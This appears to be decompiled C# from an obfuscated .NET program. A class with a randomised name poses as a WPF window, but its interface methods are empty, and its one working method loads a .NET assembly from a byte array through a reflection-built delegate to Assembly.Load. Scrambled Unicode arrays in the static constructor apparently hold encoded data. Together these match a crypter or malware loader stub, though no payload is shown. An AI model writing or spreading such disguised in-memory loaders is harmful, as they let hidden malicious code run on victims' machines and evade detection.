using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows;
using System.Windows.Markup;

namespace rltvnsebk;

public class nwvlxricw : Window, IComponentConnector
{
	internal delegate Assembly mwqwolhsb(byte[] byte_0);

	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 404)]
	private struct zhlokthkn
	{
	}

	private static readonly object d;

	private static readonly object G = new char[202];

	private static readonly Array T;

	internal static byte v/* Not supported: data(00) */;

	public void InitializeComponent()
	{
	}

	public static Assembly AppDomainLoad(byte[] qsenokpji)
	{
		return ((mwqwolhsb)Delegate.CreateDelegate(typeof(mwqwolhsb), typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) }) ?? throw new InvalidOperationException()))(qsenokpji);
	}

	private void M(int connectionId, object target)
	{
	}

	static nwvlxricw()
	{
		char[] array = new char[8];
		array[6] = '⎍';
		array[3] = '੯';
		array[2] = 'ユ';
		array[4] = '㤿';
		array[1] = 'ᳰ';
		array[0] = 'Ɣ';
		array[5] = '⣰';
		array[7] = '\u0c5e';
		T = new string[11];
		d = array;
	}
}
